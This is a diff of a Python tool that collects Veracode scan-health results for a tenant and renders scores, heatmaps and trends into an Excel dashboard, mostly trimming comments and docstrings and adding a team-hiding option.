-
 def compute_attention_score(app: ApplicationHealth,
                             cfg: dict | None = None) -> tuple[int, str, str, list[str]]:
-    """Return (score 0-100, band label, risk level, explanation drivers).
-
-    Each component contributes ``weight * risk_fraction``. Components whose
-    input is unavailable are excluded from the denominator as well as the
-    numerator, so an application is never rewarded for missing data and never
-    penalised twice for it (the data-quality component covers that).
-    """
+    """Return (score 0-100, band label, risk level, explanation drivers)."""
     cfg = cfg or DASHBOARD_CONFIG
     w = cfg["attention_score"]
-    parts: list[tuple[str, float, float, str]] = []   # (name, weight, fraction, reason)
+    parts: list[tuple[str, float, float, str]] = []
 
-    # 1. Scan health classification
     frac = {"Good": 0.0, "Fair": 0.5, "Poor": 1.0}.get(app.health_status)
     if frac is None:
         parts.append(("Scan health", w["scan_health_weight"], 1.0,
@@ -3033,7 +2621,6 @@ def compute_attention_score(app: ApplicationHealth,
         reason = f"Scan health is {app.health_status.upper()}"
         parts.append(("Scan health", w["scan_health_weight"], frac, reason))
 
-    # 2. Scan recency
     a = cfg["scan_age"]
     if app.scan_age_days is None:
         parts.append(("Scan recency", w["scan_age_weight"], 1.0, "Application has never been scanned"))
@@ -3049,10 +2636,9 @@ def compute_attention_score(app: ApplicationHealth,
             frac = 1.0
         parts.append(("Scan recency", w["scan_age_weight"], frac, f"Scan is {d} days old"))
 
-    # 3. Security findings
     t = cfg["flaws"]
     if not app.ever_scanned:
-        pass  # covered by data quality; no findings dimension exists yet
+        pass
     elif not app.flaw_severity_available:
         parts.append(("Security findings", w["flaw_weight"], 0.5,
                       "Flaw severity breakdown unavailable for this scan"))
@@ -3060,15 +2646,13 @@ def compute_attention_score(app: ApplicationHealth,
         vh, hi = app.critical_flaws or 0, app.high_flaws or 0
         frac = 0.0
         bits: list[str] = []
-        # Severity contributes absolutely; size never dilutes it.
         if vh:
             frac = max(frac, _clamp(0.7 + 0.3 * (vh / max(3 * t["very_high_red"], 1))))
             bits.append(f"{vh} open very-high flaw(s)")
         if hi:
             frac = max(frac, _clamp(0.4 + 0.4 * (hi / max(t["high_red"], 1))))
             bits.append(f"{hi} open high flaw(s)")
-        # Volume contributes relative to application size. Veracode's own score
-        # already accounts for both severity and size, so prefer it.
+        # Prefer Veracode's score: already severity-weighted and size-adjusted.
         if app.veracode_score is not None:
             if app.veracode_score < t["score_green"]:
                 frac = max(frac, _clamp((t["score_green"] - app.veracode_score)
@@ -3090,7 +2674,6 @@ def compute_attention_score(app: ApplicationHealth,
         reason = ", ".join(bits) if bits else "No open very-high or high flaws, low flaw volume"
         parts.append(("Security findings", w["flaw_weight"], frac, reason))
 
-    # 4. High-severity scan-health checks
     if app.ever_scanned:
         n = app.high_severity_issue_count
         frac = {0: 0.0, 1: 0.5, 2: 0.75}.get(n, 1.0)
@@ -3098,7 +2681,6 @@ def compute_attention_score(app: ApplicationHealth,
                   else "No high-severity scan-health issues")
         parts.append(("High-severity issues", w["high_severity_issue_weight"], frac, reason))
 
-    # 5. Trend
     if app.health_trend in ("Improving", "Stable", "Declining"):
         frac = {"Improving": 0.0, "Stable": 0.25, "Declining": 1.0}[app.health_trend]
         if app.health_trend == "Declining":
@@ -3109,7 +2691,6 @@ def compute_attention_score(app: ApplicationHealth,
             reason = f"Health unchanged at {app.health_status.upper()}"
         parts.append(("Trend", w["trend_weight"], frac, reason))
 
-    # 6. Data quality
     gaps: list[str] = []
     if not app.ever_scanned:
         gaps.append("no published scan results")
@@ -3146,7 +2727,6 @@ def compute_attention_score(app: ApplicationHealth,
             band, level = lbl, lvl
             break
 
-    # Drivers: only components that actually pushed the score up, biggest first.
     contribs = sorted(
         [(p[0], p[1] * p[2], p[3]) for p in parts if p[2] > 0],
         key=lambda x: -x[1],
@@ -3158,10 +2738,6 @@ def compute_attention_score(app: ApplicationHealth,
         drivers = ["No attention drivers; all measured dimensions are healthy"]
     return score, band, level, drivers
 
-
-# ==========================================================================
-# Aggregation
-# ==========================================================================
 
 @dataclass
 class TenantMetrics:
@@ -3207,9 +2783,7 @@ class TenantMetrics:
 
     @property
     def policy_pass_pct(self) -> float:
-        """Share of profiles with a known policy outcome that passed.
-        Unknown outcomes are excluded from the denominator rather than counted
-        as failures."""
+        """Share of profiles with a known policy outcome that passed."""
         known = self.policy_pass + self.policy_conditional + self.policy_fail
         return _pct(self.policy_pass, known)
 
@@ -3219,7 +2793,7 @@ class TenantMetrics:
 
 
 def _percentile(sorted_vals: list[float], p: float) -> float:
-    """Nearest-rank percentile. Deterministic, no numpy dependency."""
+    """Nearest-rank percentile."""
     if not sorted_vals:
         return 0.0
     k = max(0, min(len(sorted_vals) - 1, int(math.ceil(p / 100.0 * len(sorted_vals))) - 1))
@@ -3299,12 +2873,7 @@ def aggregate_tenant(apps: Sequence[ApplicationHealth], cfg: dict | None = None)
 def build_issue_heatmap(issues: Sequence[HealthIssue], total_apps: int,
                         cfg: dict | None = None,
                         prev_issue_counts: dict[int, int] | None = None) -> list[dict]:
-    """One row per health check, including checks that nothing triggered.
-
-    Severity-aware: colour combines the check's severity with how widespread it
-    is, so 'a few serious issues' stays visually distinct from 'many small
-    issues'.
-    """
+    """One row per health check, including checks that nothing triggered."""
     cfg = cfg or DASHBOARD_CONFIG
     prev_issue_counts = prev_issue_counts or {}
     by_check: dict[int, list[HealthIssue]] = {}
@@ -3368,12 +2937,7 @@ def build_issue_heatmap(issues: Sequence[HealthIssue], total_apps: int,
 def build_tenant_trend(current: TenantMetrics,
                        prev_rows: dict | None,
                        cfg: dict | None = None) -> list[dict]:
-    """Tenant-level previous-vs-current comparison.
-
-    Direction is semantic: more healthy applications is an improvement, more
-    total flaws is a deterioration. The arrow never simply follows the sign of
-    the delta.
-    """
+    """Tenant-level previous-vs-current comparison."""
     if not prev_rows:
         return []
     cfg = cfg or DASHBOARD_CONFIG
@@ -3393,7 +2957,6 @@ def build_tenant_trend(current: TenantMetrics,
         elif isinstance(d, str) and d.isdigit() and int(d) > cfg["scan_age"]["healthy_days"]:
             p_stale += 1
 
-    # (metric, previous, current, higher_is_better)
     spec = [
         ("Total applications", p_total, current.total_apps, None),
         ("Healthy (Good)", p_good, current.good, True),
@@ -3428,8 +2991,7 @@ def build_tenant_trend(current: TenantMetrics,
 
 def build_heatmap_rows(apps: Sequence[ApplicationHealth],
                        cfg: dict | None = None) -> list[dict]:
-    """Application heatmap. '_lv_<Column>' keys carry the colour for each cell
-    and are hidden from the rendered table."""
+    """Application heatmap."""
     cfg = cfg or DASHBOARD_CONFIG
     rows: list[dict] = []
     for a in apps:
@@ -3475,7 +3037,6 @@ def build_heatmap_rows(apps: Sequence[ApplicationHealth],
             "Trend": a.health_trend,
             "Quadrant": a.quadrant,
             "Top Issue": a.top_issue or "None",
-            # hidden colour helpers
             "_lv_Attention Score": a.attention_level,
             "_lv_Priority": a.attention_level,
             "_lv_Scan Health": _health_risk(a.health_status),
@@ -3573,10 +3134,6 @@ def build_priority_list(apps: Sequence[ApplicationHealth],
     return out
 
 
-# ==========================================================================
-# Excel rendering
-# ==========================================================================
-
 _FONT = "Arial"
 _TITLE_FILL = PatternFill("solid", fgColor="14213D")
 _BAND_FILL = PatternFill("solid", fgColor="1F4E79")
@@ -3607,12 +3164,7 @@ def _write_table(ws, row: int, headers: list[str], data: list[list],
                  spans: list[int] | None = None,
                  left_cols: Iterable[int] = (),
                  row_height: int | None = None) -> int:
-    """Write a table on the fixed dashboard grid.
-
-    `spans` gives the number of grid columns each logical column occupies, so
-    long-text columns can breathe without any block resizing the shared grid.
-    Column widths are owned by the sheet, never by individual tables.
-    """
+    """Write a table on the fixed dashboard grid."""
     spans = spans or [1] * len(headers)
     left = set(left_cols)
 
@@ -3662,22 +3214,16 @@ def write_dashboard_sheets(wb: Workbook,
                            tenant_trend: list[dict],
                            issue_rows: list[dict],
                            cfg: dict | None = None) -> None:
-    """Insert 'Executive Dashboard', 'App Heatmap' and 'Issue Heatmap' as the
-    first three sheets of an existing workbook. Existing sheets are untouched.
-
-    The dashboard sheet uses a mixed block layout, which cannot carry an Excel
-    autofilter. The two heatmap sheets carry the filterable/sortable tables.
-    """
+    """Insert 'Executive Dashboard', 'App Heatmap' and 'Issue Heatmap' as the first three sheets of an
+    existing workbook."""
     cfg = cfg or DASHBOARD_CONFIG
     _write_exec_sheet(wb, apps, metrics, tenant_trend, issue_rows, cfg)
     _write_app_heatmap_sheet(wb, apps, cfg)
     _write_issue_heatmap_sheet(wb, issue_rows, metrics, cfg)
-    # Order: dashboard, app heatmap, issue heatmap, then everything pre-existing.
     order = ["Executive Dashboard", "App Heatmap", "Issue Heatmap"]
     wb._sheets.sort(key=lambda s: order.index(s.title) if s.title in order else len(order))
 
 
-# Fixed 12-column grid for the dashboard sheet. Set once, never overridden.
 _EXEC_GRID = 12
 _EXEC_WIDTHS = {1: 26}
 for _c in range(2, _EXEC_GRID + 1):
@@ -3709,7 +3255,6 @@ def _write_exec_sheet(wb: Workbook, apps: Sequence[ApplicationHealth],
         return r + 1
 
     r = 1
-    # ---- title
     ws.merge_cells(start_row=r, start_column=1, end_row=r + 1, end_column=W)
     c = ws.cell(row=r, column=1, value="VERACODE TENANT SCAN HEALTH")
     c.fill = _TITLE_FILL
@@ -3728,7 +3273,6 @@ def _write_exec_sheet(wb: Workbook, apps: Sequence[ApplicationHealth],
     ws.row_dimensions[r].height = 20
     r += 2
 
-    # ---- KPI cards
     comp_lv = ("GREEN" if m.scan_compliance_pct >= 80
                else "YELLOW" if m.scan_compliance_pct >= 60 else "RED")
     r = _kpi_row(ws, r, [
@@ -3758,7 +3302,6 @@ def _write_exec_sheet(wb: Workbook, apps: Sequence[ApplicationHealth],
          "RED" if (m.critical_flaws or m.high_flaws) else "GREEN"),
     ], cfg, span=W)
 
-    # ---- tenant health distribution
     r = band(r, "TENANT SCAN HEALTH DISTRIBUTION")
     for label, n, lv in (("Good", m.good, "GREEN"), ("Fair", m.fair, "YELLOW"),
                          ("Poor", m.poor, "RED"), ("Unknown", m.unknown, "GRAY")):
@@ -3778,7 +3321,6 @@ def _write_exec_sheet(wb: Workbook, apps: Sequence[ApplicationHealth],
                 "They are never counted as healthy.")
     r += 1
 
-    # ---- attention distribution
     r = band(r, "ATTENTION SCORE DISTRIBUTION")
     meaning = {"RED": "Immediate attention (80-100)", "ORANGE": "High priority (60-79)",
                "YELLOW": "Attention required (40-59)", "GREEN": "Normal or monitor (0-39)"}
@@ -3791,7 +3333,6 @@ def _write_exec_sheet(wb: Workbook, apps: Sequence[ApplicationHealth],
                      spans=[2, 3, 7], left_cols=(2,))
     r += 1
 
-    # ---- priority matrix
     r = band(r, "PRIORITY MATRIX   scan health vs security findings")
     r = note(r, "Two independent dimensions. Built only from indicators the scanner produces; "
                 "business criticality is not available from the Veracode data and is not inferred.")
@@ -3823,7 +3364,6 @@ def _write_exec_sheet(wb: Workbook, apps: Sequence[ApplicationHealth],
     r = note(r, f"Insufficient data: {q.get('Insufficient Data', 0)} application profile(s).")
     r += 1
 
-    # ---- top organisational issues
     r = band(r, "TOP ORGANISATIONAL ISSUES")
     data, levels = [], []
     for row_ in [x for x in issue_rows if x["Apps Affected"] > 0][:cfg["top_n_issues"]]:
@@ -3839,7 +3379,6 @@ def _write_exec_sheet(wb: Workbook, apps: Sequence[ApplicationHealth],
     r = note(r, "Full list of all 31 health checks is on the 'Issue Heatmap' sheet.")
     r += 1
 
-    # ---- tenant trend
     r = band(r, "TENANT TREND vs PREVIOUS REPORT")
     if tenant_trend:
         arrows = {"UP": "\u2191", "DOWN": "\u2193", "=": "\u2192", "+": "\u2192", "-": "\u2192"}
@@ -3855,7 +3394,6 @@ def _write_exec_sheet(wb: Workbook, apps: Sequence[ApplicationHealth],
                     "trend analysis.")
     r += 1
 
-    # ---- applications requiring attention
     r = band(r, "APPLICATIONS REQUIRING ATTENTION")
     r = note(r, "Ranked by the transparent Attention Score. This is a scan-health and findings "
                 "prioritisation ranking, not a 'most vulnerable applications' list.")
@@ -4042,17 +3580,13 @@ def _write_issue_heatmap_sheet(wb: Workbook, issue_rows: list[dict],
     ws.freeze_panes = ws.cell(row=hr + 1, column=3)
 
 
-# ==========================================================================
-# Top-level dashboard entry point
-# ==========================================================================
-
 def generate_dashboard(health_rows: Sequence[dict],
                        issue_records: Sequence[dict],
                        prev_rows: dict | None = None,
                        cfg: dict | None = None,
                        check_categories: dict[int, str] | None = None,
                        prev_issue_counts: dict[int, int] | None = None) -> dict:
-    """Normalize, score and aggregate. Returns everything the writers need."""
+    """Normalize, score and aggregate."""
     cfg = cfg or DASHBOARD_CONFIG
     apps, issues = build_application_health(
         health_rows, issue_records, prev_rows, cfg, check_categories)
@@ -4078,10 +3612,6 @@ def write_dashboard_xlsx(path: str, bundle: dict) -> None:
     wb.save(path)
 
 
-# ==========================================================================
-# Main
-# ==========================================================================
-
 def _print_summary(health: list[dict]) -> None:
     tot = len(health)
     good = sum(1 for r in health if r.get("Health")=="Good")
@@ -4104,11 +3634,10 @@ def _print_summary(health: list[dict]) -> None:
 
 
 def _plan_note(n_apps: int, sandboxes: bool, budget: float) -> str:
-    """Estimate runtime from the published limits and the real call mix.
-    """
+    """Estimate runtime from the published limits and the real call mix."""
     per_app = 4.0
     if sandboxes:
-        per_app += 1.0 + 4.0        # sandbox list, plus one sandbox on average
+        per_app += 1.0 + 4.0
     report_rpm = RateLimiter.LIMITS["report"] * budget / 100.0
     xml_rpm = RateLimiter.LIMITS["xml"] * budget / 100.0
     report_calls = 1.0 + (1.0 if sandboxes else 0.0)
@@ -4120,9 +3649,7 @@ def _plan_note(n_apps: int, sandboxes: bool, budget: float) -> str:
             f"{n_apps:,} profiles")
 
 
-# Flags that existed in earlier versions and no longer do anything. Accepted
-# silently-with-a-warning rather than rejected, so scheduled jobs do not start
-# hard-failing on an upgrade.
+# Accepted with a warning so scheduled jobs do not break on upgrade.
 _RETIRED_FLAGS = {
     "--request-delay": "replaced by --rate-budget, which paces each endpoint "
                        "class against its own published limit",
@@ -4145,7 +3672,7 @@ def _strip_retired(argv: list[str]) -> list[str]:
         if name in _RETIRED_FLAGS:
             log.warning("[!] %s is retired and ignored: %s", name, _RETIRED_FLAGS[name])
             if "=" not in a and i + 1 < len(argv) and not argv[i + 1].startswith("-"):
-                i += 1      # consume its value
+                i += 1
             i += 1
             continue
         out.append(a)
@@ -4167,12 +3694,10 @@ def main() -> None:
                         "<out-dir>/tenant/<region>/<timestamp>/; rerunning the same command "
                         "resumes the newest unfinished run")
     p.add_argument("--output-format", choices=["xlsx","csv","json"], default="xlsx")
-    # default None so an explicit --region can be told apart from the default
-    # (a --scan link carries its own region); resolved to commercial below.
+    # None so an explicit --region can be told apart; a --scan link carries its own region.
     p.add_argument("--region", choices=["commercial","eu"], default=None,
                    help="Veracode region (default commercial)")
 
-    # --- pacing
     p.add_argument("--rate-budget", type=float, default=70.0, metavar="PCT",
                    help="Share of Veracode's published per-IP rate limits to consume, "
                         "per endpoint class (default 70). Each class is paced against its "
@@ -4199,7 +3724,6 @@ def main() -> None:
                         "abandoning THAT REQUEST (default 3600). The run never aborts on a "
                         "mid-run auth failure.")
 
-    # --- scope
     p.add_argument("--max-apps", type=int, default=0)
     p.add_argument("--app-name-filter", default=None, help="Regex to filter app names")
     p.add_argument("--include-sandboxes", action="store_true",
@@ -4207,7 +3731,6 @@ def main() -> None:
     p.add_argument("--skip-no-scan", action="store_true")
     p.add_argument("--skip-checks", default=None, help="Comma-separated check numbers to skip")
 
-    # --- output
     p.add_argument("--detail", choices=["csv","xlsx","none"], default="csv",
                    help="Where per-module and per-file rows go. 'csv' (default) streams them "
                         "to companion CSVs during the run: constant memory, no row cap. "
@@ -4234,7 +3757,6 @@ def main() -> None:
     p.add_argument("--keep-snapshots", type=int, default=0, metavar="N",
                    help="After a run, keep only the newest N snapshots (default 0 = keep all)")
 
-    # --- durability
     p.add_argument("--checkpoint", default=None,
                    help="JSONL checkpoint path (default: <output>.ckpt.jsonl). Written and "
                         "fsync'd after every profile. Rerun the same command to resume.")
@@ -4245,7 +3767,6 @@ def main() -> None:
                    help="List the profiles that would be processed, with a runtime estimate")
     p.add_argument("--log-level", choices=["DEBUG","INFO","WARNING"], default="INFO")
 
-    # --- single-application report (any of --app/--app-id/--app-guid enables it)
     sa = p.add_argument_group(
         "single-application report",
         "Deep health report for one application profile: build history, trends, "
@@ -4290,6 +3811,9 @@ def main() -> None:
                     help="Cached API responses (default <out-dir>/cache). Safe to delete at any "
                          "time; trend history lives in <out-dir>/history")
     sa.add_argument("--no-cache", action="store_true", help="Neither read nor write the cache")
+    sa.add_argument("--hide-teams", default=None, metavar="PATTERNS",
+                    help="Comma-separated team name patterns not to show (* wildcard), added to "
+                         "the default 'Service Delivery - *'")
     sa.add_argument("--refresh-cache", action="store_true",
                     help="Ignore cached responses but write fresh ones")
     sa.add_argument("--fail-on", default=None, metavar="RULES",
@@ -4298,8 +3822,7 @@ def main() -> None:
     sa.add_argument("--baseline-window", type=int, default=10, metavar="N",
                     help="Published builds used for the duration baseline (default 10)")
 
-    # A Windows console or a redirected stream may use a legacy code page; an
-    # application name it cannot encode must never crash the run.
+    # Legacy Windows code pages must not crash on an app name they cannot encode.
     for stream in (sys.stdout, sys.stderr):
         with contextlib.suppress(AttributeError, ValueError):
             stream.reconfigure(errors="backslashreplace")
@@ -4352,11 +3875,7 @@ def main() -> None:
             p.error("--skip-checks must be comma-separated integers")
         log.info("[*] Skipping checks: %s", sorted(skip_checks))
 
-    # ---- single-application mode. Dispatched before any bulk state (checkpoint,
-    # detail CSVs) is created, so the bulk path is untouched. The import is lazy
-    # because app_report imports this module: run as a script, this file is
-    # __main__, and app_report works entirely against its own `scan_health`
-    # import, so no object crosses between the two copies.
+    # Lazy import: app_report imports this module, and run as a script this file is __main__.
     if (args.app is not None or args.app_id is not None or args.app_guid is not None
             or args.scan is not None):
         if args.app_name_filter:
@@ -4364,9 +3883,6 @@ def main() -> None:
         from helpers import app_report
         raise SystemExit(app_report.run(args, skip_checks))
 
-    # ---- run folder: by default every bulk run gets its own folder under
-    # <out-dir>/tenant/<region>/, and rerunning resumes the newest unfinished
-    # one with the same scope. An explicit --output is used exactly as given.
     args.layout_run = args.output is None
     if args.layout_run:
         from helpers import tenant_report
@@ -4381,7 +3897,6 @@ def main() -> None:
         elif not args.dry_run:
             log.info("[*] Run folder: %s", out_file.parent)
 
-    # ---- checkpoint (a dry run never creates one)
     ckpt_path = args.checkpoint or f"{Path(args.output).with_suffix('')}.ckpt.jsonl"
     if args.dry_run and not Path(ckpt_path).exists():
         ckpt_path = None
@@ -4405,11 +3920,10 @@ def main() -> None:
 
     name_filter = re.compile(args.app_name_filter) if args.app_name_filter else None
     failures: list[str] = []
-    guid_by_id: dict[str, str] = {}     # legacy app id -> REST GUID, for snapshots only
+    guid_by_id: dict[str, str] = {}
 
     def _finalize(client: "VeracodeClient | None", complete: bool = True) -> None:
-        """Write the report from whatever is durable. Runs in a finally block,
-        so it executes on every exit path including auth failure and Ctrl-C."""
+        """Write the report from whatever is durable."""
         h_rows = ckpt.rows["health"]
         if not h_rows:
             log.warning("[!] No application rows collected; nothing to write.")
@@ -4458,8 +3972,7 @@ def main() -> None:
             from helpers import output_layout
             output_layout.mark_run(Path(args.output), "complete" if complete else "partial")
 
-        # Snapshot and tenant trend summary. After the reports, so they can
-        # never affect them; never on a dry run; never fatal; no API calls.
+        # After the reports, so a snapshot can never affect them.
         if not args.dry_run:
             try:
                 from helpers import tenant_analytics
@@ -4549,16 +4062,14 @@ def main() -> None:
                 mod_rows = [m.to_row() for m in mr]
                 file_rows = [f.to_row() for f in fr]
                 if args.detail == "csv":
-                    # Written before the checkpoint record, so a crash can only
-                    # ever leave detail rows for a profile that is replayed.
+                    # Before the checkpoint record, so a crash leaves only rows that are replayed.
                     detail.write("modules", mod_rows)
                     detail.write("files", file_rows)
                 elif args.detail == "xlsx":
                     with lock:
                         buffered_mods.extend(mod_rows)
                         buffered_files.extend(file_rows)
-                # Even when nothing came back (--skip-no-scan), record the key so
-                # a resumed run does not re-fetch this profile.
+                # Record the key even when nothing came back, so resume does not re-fetch it.
                 keys = [(s.app_name, s.sandbox) for s in sr] or [(app["name"], "")]
                 ckpt.record(keys,
                             health=[s.to_row() for s in sr],
